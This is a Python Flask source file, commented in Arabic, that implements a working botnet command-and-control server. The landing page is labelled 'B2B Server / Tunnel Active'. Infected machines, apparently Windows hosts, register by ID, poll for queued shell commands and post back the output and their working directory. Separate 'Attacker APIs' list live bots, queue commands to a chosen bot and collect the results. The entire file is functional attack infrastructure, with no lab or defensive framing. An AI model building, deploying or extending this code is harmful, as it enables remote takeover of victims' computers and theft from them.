from flask import Flask, request, jsonify, render_template_string
import time
import json

app = Flask(__name__)

# قاعدة بيانات بسيطة
bots = {}          # bot_id -> {"ip": ip, "last_seen": time, "cwd": path}
commands = {}      # bot_id -> [list of commands]
results = {}       # bot_id -> [list of results]

@app.route('/')
def index():
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>B2B Server</title>
        <style>
            body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .box { border: 2px solid #00ff00; padding: 40px; text-align: center; background: #000; }
            h1 { font-size: 48px; margin: 0; }
            .sub { color: #006600; font-size: 14px; margin-top: 10px; }
        </style>
    </head>
    <body>
        <div class="box">
            <h1>B2B Server</h1>
            <div class="sub">Tunnel Active</div>
            <div class="sub" style="margin-top:20px; color:#003300;">⚡ Ready</div>
        </div>
    </body>
    </html>
    """

# ===== الـ Agent APIs =====
@app.route('/register', methods=['POST'])
def register():
    data = request.json
    bot_id = data.get('id')
    if bot_id:
        bots[bot_id] = {
            "ip": request.remote_addr,
            "last_seen": time.time(),
            "cwd": "C:\\"
        }
        if bot_id not in commands:
            commands[bot_id] = []
        if bot_id not in results:
            results[bot_id] = []
        return jsonify({"status": "ok"})
    return jsonify({"status": "error"}), 400

@app.route('/get_command/<bot_id>', methods=['GET'])
def get_command(bot_id):
    if bot_id not in bots:
        return jsonify({"command": ""})
    
    # نجدد آخر ظهور
    bots[bot_id]["last_seen"] = time.time()
    
    # نبحث عن أمر
    if bot_id in commands and commands[bot_id]:
        cmd = commands[bot_id].pop(0)
        return jsonify({"command": cmd})
    
    return jsonify({"command": ""})

@app.route('/send_result', methods=['POST'])
def send_result():
    data = request.json
    bot_id = data.get('bot_id')
    result = data.get('result', '')
    new_cwd = data.get('cwd', '')
    
    if bot_id:
        if bot_id in results:
            results[bot_id].append(result)
        if bot_id in bots and new_cwd:
            bots[bot_id]["cwd"] = new_cwd
        if bot_id in bots:
            bots[bot_id]["last_seen"] = time.time()
    
    return jsonify({"status": "ok"})

# ===== Attacker APIs =====
@app.route('/api/list_bots', methods=['GET'])
def list_bots():
    now = time.time()
    active = []
    for bot_id, info in bots.items():
        if now - info["last_seen"] < 30:
            active.append({
                "id": bot_id,
                "ip": info["ip"],
                "cwd": info.get("cwd", "C:\\"),
                "last_seen": info["last_seen"]
            })
    return jsonify(active)

@app.route('/api/send_cmd', methods=['POST'])
def send_cmd():
    data = request.json
    bot_id = data.get('bot_id')
    cmd = data.get('cmd')
    
    if bot_id not in bots:
        return jsonify({"status": "error", "message": "Bot not found"}), 404
    
    if bot_id not in commands:
        commands[bot_id] = []
    
    commands[bot_id].append(cmd)
    return jsonify({"status": "ok", "message": "Command queued"})

@app.route('/api/get_result/<bot_id>', methods=['GET'])
def get_result(bot_id):
    if bot_id not in results:
        return jsonify({"results": []})
    
    # نجيب النتائج ونمسحهم
    res = results[bot_id].copy()
    results[bot_id] = []
    return jsonify({"results": res})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)